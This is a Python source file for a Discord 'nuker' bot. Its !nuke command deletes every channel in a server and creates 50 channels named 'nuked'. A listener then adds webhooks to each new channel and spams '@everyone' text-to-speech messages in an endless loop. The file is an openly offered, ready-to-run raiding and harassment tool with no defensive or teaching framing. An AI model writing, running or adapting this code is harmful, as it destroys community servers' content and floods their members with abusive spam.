#Imports
from discord.ext import commands

#bot, commandPrefix
bot = commands.Bot(command_prefix="!", case_sensitive=True)
#remove "help" command
bot.remove_command("help")

#Your Discord User ID, makes the bot command only works for you.
USERID = ""

#Message when spamming
spamMessage = "@everyone hiiii"
#Name of channels when spamming channels
channelName = "nuked"

@bot.event
async def on_ready():
    print("Successfully Logged in {}".format(bot.user))

@bot.command()
async def nuke(ctx):
    if USERID == "":
        pass
    elif str(ctx.message.author.id) not in USERID:
        return
    #look up for all channels in this guild and delete them
    for channel in ctx.guild.channels:  
        try:
            await channel.delete()
        except:
            continue
    #Create Channels
    for i in range(1, 51):
       await ctx.guild.create_text_channel(f"{channelName}-{i}")
    

#Listen on create channel event, create webhook on them and spam the webhook
@bot.event
async def on_guild_channel_create(channel):
    print(channel.name)
    if channel.name.startswith(channelName.lower()):
        webhook = await channel.create_webhook(name="By Dennis911")
        while True:
            try:
                await webhook.send(spamMessage, tts=True)
            except:
                return

#Bot Token
bot.run("")